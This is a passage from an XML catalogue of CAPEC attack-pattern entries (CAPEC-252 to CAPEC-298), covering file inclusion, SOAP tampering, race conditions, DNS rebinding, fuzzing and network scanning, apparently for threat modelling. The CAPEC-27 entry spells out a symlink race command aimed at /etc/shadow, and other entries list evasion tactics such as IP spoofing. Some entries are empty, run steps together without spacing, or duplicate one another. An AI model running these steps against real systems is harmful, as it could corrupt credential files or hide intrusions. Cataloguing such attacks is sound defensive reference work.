  <description>The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</description>
</threat>
<threat label="CAPEC-252" name="PHP Local File Inclusion" type="Standard" reference="CAPEC">
  <description>The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.</description>
</threat>
<threat label="CAPEC-254" name="DTD Injection in a SOAP Message" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-256" name="SOAP Array Overflow" type="Detailed" reference="CAPEC">
  <description>An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.</description>
</threat>
<threat label="CAPEC-257" name="Abuse of transaction data strutcture" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-258" name="Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-259" name="Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching" type="Standard" reference="CAPEC">
  <description>Attackers can capture application code bound for an authorized client during patching and can use it, as-is or through reverse-engineering, to glean sensitive information or exploit the trust relationship between the client and server.The attacker sets up a sniffer in the path between the server and the client and watches the traffic.The attacker sets up a sniffer in the path between the server and the client.Attacker receives notification that the computer/OS/application has an available update for patching, loads the sniffer set up during Explore phase, and extracts patching code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.Attacker loads the sniffer to capture the application code bound during patching.The attacker proceeds to reverse engineer the captured code.The attacker can capture the application code bound for the target.The communication between the server and client is encrypted. The attacker may still possible to lift key material from the client.</description>
</threat>
<threat label="CAPEC-26" name="Leveraging Race Conditions" type="Standard" reference="CAPEC">
  <description>This attack targets a race condition occurring when multiple processes access and manipulate the same resource concurrently and the outcome of the execution depends on the particular order in which the access takes place. The attacker can leverage a race condition by &quot;running the race&quot;, modifying the resource and modifying the normal execution flow. For instance a race condition can occur while accessing a file, the attacker can trick the system by replacing the original file with his version and cause the system to read the malicious file.The attacker explores to gauge what level of access he has.The attacker gains access to a resource on the target host. The attacker modifies the targeted resource. The resource's value is used to determine the next normal execution action.The resource is modified/checked concurrently by multiple processes. By using one of the processes, the attacker is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the Attacker to abuse the target host.Vulnerability testing tool can be used to probe for race condition.The attacker may also look for temporary file creation. The attacker may tries to replace them and take advantage of a race condition.</description>
</threat>
<threat label="CAPEC-260" name="Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-261" name="Fuzzing for garnering (through web or log) other adjacent user/sensitive data as an authorized system user (overly broad but valid SQL queries)" type="Detailed" reference="CAPEC">
  <description>An attacker who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide. Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. For example, a client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. In the above example, additional information might include social security numbers or salaries. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. In this particular attack, the fuzzing is applied to the format of the expected templates, creating variants that request additional information, exclude limiting clauses, or alter fields that identify the requester in order to subvert access controls. The attacker may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.</description>
</threat>
<threat label="CAPEC-263" name="Force Use of Corrupted Files" type="Standard" reference="CAPEC">
  <description>This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.</description>
</threat>
<threat label="CAPEC-264" name="Environment variable manipulation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-265" name="Global variable manipulation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-266" name="Manipulate Canonicalization" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-267" name="Leverage Alternate Encoding" type="Standard" reference="CAPEC">
  <description>This attack leverages the possibility to encode potentially harmful input and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult.Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Manually inspect the application to find entry points.Inputs are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used by the application. Even though none appear, the application may still use them if they are provided.No inputs seem to be used by the application. They might still be provided to another component (web service, database, system call, etc.).Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.Try to use different encodings of content in order to bypass validation routines.The application accepts user-controllable input.Attacker may try to inject dangerous characters using different encoding using (example of invalid UTF-8 characters, overlong UTF-8, Chinese characters in Big-5, etc.). The attacker hopes that the targeted system does poor input filtering for all the different possible representations of the malicious characters. Malicious inputs can be sent through an HTML form, directly encoded in the URL or as part of a database query. The attacker can use scripts or automated tools to probe for poor input filtering.</description>
</threat>
<threat label="CAPEC-268" name="Audit Log Manipulation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-269" name="Registry Manipulation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-27" name="Leveraging Race Conditions via Symbolic Links" type="Detailed" reference="CAPEC">
  <description>This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to her. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attacker's Symlink link. If the attacker can insert malicious content in the temporary file she will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.This attack pattern is only applicable on platforms that support symbolic links.Research target platform to determine whether it supports symbolic links.Create a symbolic link and ensure that it works as expected on the given platform.Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.Use kernel tracing utility such as ktrace to monitor application behaviorUse debugging utility such as File Monitor to monitor the application's filesystem I/O callsWatch temporary directories to see when temporary files are created, modified and deleted.Analyze source code for open-source systems like Linux, Apache, etc.Attacker can watch files being created, modified and/or deleted by application.Application does not seem to perform any filesystem I/O operations.The attacker verifies ability to write to the target host's file system.Create a file that does not exist in the target directory (e.g. &quot;touch temp.txt&quot; in UNIX-like systems)On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.Verify permissions on target directoryTarget directory is a globally writable temp directory (e.g. /tmp in many UNIX-like systems)Target directory is writable by the attacker's effective user ID.Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.Create an infinite loop containing commands such as &quot;rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat&quot;. Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) &quot;rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat&quot;, and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.The attacker will certainly look for file system locations where he can write and create Symlink links.The attacker may also observe the system and locate the temporary files created during a call to a certain function.This attack can cause privilege escalation, modification of resources or denial of services.</description>
</threat>
<threat label="CAPEC-270" name="Craft a Maliciously Misconfigured Registry" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-271" name="Schema Poisoning" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-272" name="Protocol Manipulation" type="Standard" reference="CAPEC">
  <description>The attacker subverts a communications protocol to perform an attack. These attacks can allow the attacker to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. These attacks target invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.</description>
</threat>
<threat label="CAPEC-273" name="HTTP Response Smuggling" type="Detailed" reference="CAPEC">
  <description>An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.</description>
</threat>
<threat label="CAPEC-274" name="HTTP Verb Tampering" type="Detailed" reference="CAPEC">
  <description>An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.</description>
</threat>
<threat label="CAPEC-275" name="DNS Rebinding" type="Standard" reference="CAPEC">
  <description>An attacker serves content whose IP address is resolved by a DNS server that it controls and after initial contact by a web browser or similar client it changes the IP address to which its name resolves to an address within the target browser's organization that is not publicly accessible, thus allowing the web browser to examine this internal address on its behalf. Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. In a DNS binding attack an attacker publishes content on their own server with their own name and DNS server. The first time the target accesses the attacker's content, the attacker's name must be resolved to an IP address. The attacker's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value. When the target makes a subsequent request to the attacker's content the attacker's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the named internal addresses. This allows attackers to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the attacker identifies, additional attacks are possible. This attack differs from pharming attacks in that the attacker is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services.An attacker publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.Attacker uses Web advertisements to attract the victim to access attacker’s DNS. Explore the versions of web browser or flash players in HTTP request.Old versions that have DNS rebinding vulnerabilities.New versions that have fixed DNS rebinding vulnerabilities.The first time the target accesses the attacker's content, the attacker's name must be resolved to an IP address. The attacker's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value. the target makes a subsequent request to the attacker's content the attacker's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source.The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the named internal addresses.The attacker can then use scripts in the content the target retrieved from the attacker in the original message to exfiltrate data from the internal addresses. This allows attackers to discover sensitive information about the internal network of an enterprise.Attacker attempts to use victim’s browser as an HTTP proxy to other resources inside the target’s security zone. This allows two IP addresses placed in the same security zone.Attacker tries to scan and access all internal hosts in victim’s local network by sending multiple short-lived IP addresses.This attack allows attackers to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the attacker identifies, additional attacks are possible.</description>
</threat>
<threat label="CAPEC-276" name="Inter-component Protocol Manipulation" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-277" name="Data Interchange Protocol Manipulation" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-279" name="Soap Manipulation" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-28" name="Fuzzing" type="Standard" reference="CAPEC">
  <description>Fuzzing is a software testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occured. Fuzzing treats the system as a blackbox and is totally free from any preconceptions or assumptions about the system.An attacker can leverage fuzzing to try to identify weaknesses in the system. For instance fuzzing can help an attacker discover certain assumptions made in the system about user input. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions without really knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve his goals.The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.The software produces an indicator that the attacker can see (error message, altered error state in a protocol, etc.).The previous step led to plausible, practical fuzz inputs.Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.Identify and embed shellcode for the target system.Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)Induce denial of service by exploiting resource leaks or bad error handling.A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.Take pauses between fuzzing attempts (may not be very practical). Spoof IP addresses so that it does not look like all data is coming from the same source.</description>
</threat>
<threat label="CAPEC-280" name="SOAP Parameter Tampering" type="Detailed" reference="CAPEC">
  <description>An attacker sends a SOAP message where the field values are other than what the server is likely to expect in order to precipitate non-standard server behavior. In a SOAP message, parameters take the form of values within XML elements. The server will have an XML schema that indicates certain restrictions on these parameter values. For example, the server may expect a parameter to be a string with fewer than 10 characters, or a number less than 100. In a SOAP parameter tampering attack, an attacker either violates this schema, or takes advantage of flexibility within the schame (for example, a lack of a character limit) to provide parameters that a server might not expect. Examples of unexpected parameters include oversized data, data with different data types, inserting metacharacters within data, and sending contextually inappropriate data (for example, sending a non-existant product name in a product name field or using an our-of-order sequence number). Results of this attack can include information disclosure, denial of service, or even execution of arbitrary code.</description>
</threat>
<threat label="CAPEC-281" name="Analytic Attacks" type="Meta" reference="CAPEC">
  <description>An attacker performs an analysis of a target system, protocol, message, or application in order to overcome protections on the target or as a precursor to other attacks. Analysis can involve dissection of an application, analysis of message patterns, formal analysis of protocols, or other methods. The outcome of these attacks can be disclosure of sensitive information, or disclosure of security configuration that leads to further attacks targeted to discovered weaknesses.</description>
</threat>
<threat label="CAPEC-285" name="ICMP Echo Request Ping" type="Detailed" reference="CAPEC">
  <description>An attacker sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognise the key security goal of the attacker is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An attacker can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc. The attackers goal is to discover as many potential targets as possible can utilise a wide range of techniques to achieve this end. ICMP pings have the following characteristics:1. Host Discovery: Can be used to discover if a host is alive via ICMP Echo Reply Message2. Effective Against: LANs or Internal IP address ranges where firewall or ACL rules are less restrictive3. Weak Against: Firewalls properly configured to block ICMP Echo Request and Echo Replies.4. Port State: Unable to determine the status of ports on a host.</description>
</threat>
<threat label="CAPEC-286" name="Network Reconnaissance" type="Meta" reference="CAPEC">
  <description>An attacker engages in network reconnaissance operations to gather information about a target network or its hosts. Network Reconnaissance techniques can range from stealthy to noisy and utilize different tools and methods depending upon the scope of the reconnaissance. Some techniques may target single hosts while others are used against entire network address ranges, such as a CIDR class C or B network. In general, reconnaissance activities fall into 5 distinct categories.1. Host Discovery: The ICMP methods, as well as messages of other protocol types, commonly UDP and TCP, to determine if a host is active on an IP address.2. Port Scanning: The application of various methods to determine the status of the ports on the remote device. Each machine can have a possible 65535 UDP and TCP ports that provide a service to network clients. The goal of port scanning is to determine which ports on a machine are open, as well as which ports are firewalled or filtered.3. Operating System Fingerprinting: use of various probing methods to determine idiosyncratic behaviors of a remote device that allow the attacker to determine the operating system. Although networking protocols are governed by standards, each operating system exhibits unique characteristics of its implementation of these standards. By sending malformed packets or datagrams an attacker can solicit responses from an device that allow a highly reliable inference about its operating system.4. Service Enumeration: Application-layer services can run on arbitrary ports, so an attacker must probe or interact with a remote port in order to obtain a fingerprint or signature of the application or protocol daemon using the port for communication.5. Firewall Auditing: An attacker uses a number of techniques to determine which types of data can be infiltrated or exfiltrated through a firewall. These techniques require a responsive host protected by a firewall so that the attacker can map out which types of protocols and message types reach the' host or hosts and generate a response. Applied together these activities allow an attack to map out a target network, its topology, as well as gather detailed device configuration information.</description>
</threat>
<threat label="CAPEC-287" name="TCP SYN Scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its enormous advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method the primary advantages of SYN scanning are its universality and speed. RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered. A TCP Connect scan has the following characteristics:1. Speed: TCP SYN scanning is fast compared to other types of scans.2. Stealth: TCP SYN scanning is stealthy and SYN scan detection is fraught with false positives.3. Open Port: Detects that a port is open via a successful SYN/ACK to the SYN.4. Closed Port: Detects that a port is closed via a successful RST to the SYN5. Filtered Port: No response, or ICMP messages, indicates the presence of a filter.6. Unfiltered Port: Cannot distinguish between a state-fully filtered port and an unfiltered port. SYN scanning is fast and provides the attacker with a wealth of information. The primary drawback is that SYN scanning requires the ability to access &quot;raw sockets&quot; in order to create the packets. As a result, it is not possible to perform a SYN scan from some systems (Windows XP SP 2). On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.</description>
</threat>
<threat label="CAPEC-288" name="ICMP Echo Request Ping" type="Detailed" reference="CAPEC">
  <description>An attacker sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognise the key security goal of the attacker is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An attacker can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc. The attackers goal is to discover as many potential targets as possible can utilise a wide range of techniques to achieve this end. ICMP pings have the following characteristics:1. Host Discovery: Can be used to discover if a host is alive via ICMP Echo Reply Message2. Effective Against: LANs or Internal IP address ranges where firewall or ACL rules are less restrictive3. Weak Against: Firewalls properly configured to block ICMP Echo Request and Echo Replies.4. Port State: Unable to determine the status of ports on a host.</description>
</threat>
<threat label="CAPEC-289" name="Infrastructure-based footprinting" type="Meta" reference="CAPEC">
  <description>&quot;Infrastructure-based footprinting involves interacting with available network or application resources for the purpose of gathering information about the architecture, topology, configuration, or potential vulnerabilities and exposures of a target networking infrastructure.&quot;</description>
</threat>
<threat label="CAPEC-29" name="Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions" type="Standard" reference="CAPEC">
  <description>This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. The typical example is the file access. The attacker can leverage a file access race condition by &quot;running the race&quot;, meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the attacker could do something such as replace the file and cause an escalation of privilege.The attacker explores to gauge what level of access he has.The attacker confirms access to a resource on the target host. The attacker confirms ability to modify the targeted resource.The attacker decides to leverage the race condition by &quot;running the race&quot;, meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the attacker can replace the resource and cause an escalation of privilege.Vulnerability testing tool can be used to probe for race condition.The attacker may also look for temporary file creation. The attacker may try to replace them and take advantage of a race condition.</description>
</threat>
<threat label="CAPEC-290" name="Enumerate Mail Exchange (MX) Records" type="Standard" reference="CAPEC">
  <description>An attacker enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a Firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.</description>
</threat>
<threat label="CAPEC-291" name="DNS Zone Transfers" type="Standard" reference="CAPEC">
  <description>An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.</description>
</threat>
<threat label="CAPEC-292" name="Host Discovery" type="Standard" reference="CAPEC">
  <description>An attacker sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. An attacker usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal of the attacker is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the attacker can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep' where a particular kind of ping is sent to a range of IP addresses.</description>
</threat>
<threat label="CAPEC-293" name="Traceroute Route Enumeration" type="Detailed" reference="CAPEC">
  <description>An attacker uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow an attacker to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP. As more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed</description>
</threat>
<threat label="CAPEC-294" name="ICMP Address Mask Request" type="Detailed" reference="CAPEC">
  <description>An attacker sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, &quot;Internet Standard Subnetting Procedure.&quot; An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps an attacker plan router-based attacks as well as denial-of-service attacks against the broadcast address. Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the attacker determine operating system or firmware version. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages.</description>
</threat>
<threat label="CAPEC-295" name="ICMP Timestamp Request" type="Detailed" reference="CAPEC">
  <description>An attacker sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An attacker can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. An attacker may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.</description>
</threat>
<threat label="CAPEC-296" name="ICMP Information Request" type="Detailed" reference="CAPEC">
  <description>An attacker sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type that no has any use. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.</description>
</threat>
<threat label="CAPEC-297" name="TCP ACK Ping" type="Detailed" reference="CAPEC">
  <description>An attacker sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, an attacker identify that the host is alive by looking for a RST packet. Typically a remote server will respond with a RST regardless of whether a port is open or closed. In either case, the attacker can determine that the host is alive. TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. TCP ACK pings are most likely to fail in cases where a stateful firewall is present. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping has the following characteristics:1. Host Discovery: Can be used to discover if a host is alive via RST response packets sent from the host.2. Effective Against: Stateless Firewalls due to a typical lack of rules that reject unsolicited ACK packets.3. Weak Against: Stateful Firewalls due to the ability to reject a packet not part of an existing connection.4. Port State: Unable to determine if a port is open or closed.The tool nmap will send TCP ACK pings when the command line &quot;-PA&quot; switch is used. Sending an ACK ping requires the ability to access &quot;raw sockets&quot; in order to create the packets with direct access to the packet header.</description>
</threat>
<threat label="CAPEC-298" name="UDP Ping" type="Detailed" reference="CAPEC">
  <description>An attacker sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an ICMP port unreachable message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ' ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts. A UDP Ping has the following characteristics:1. Host Discovery: Can be used to discover if a host is alive via ICMP Port Unreachable Messages.2. Effective Against: Firewalls that allow some incoming UDP which are not configured to block egress ICMP messages.3. Weak Against: Firewalls properly configured to block UDP datagrams that are also block egress ICMP messages.4. Port State: Able to determine if a port is closed via ICMP Port Unreachable Messages.</description>
</threat>
<threat label="CAPEC-299" name="TCP SYN Ping" type="Detailed" reference="CAPEC">
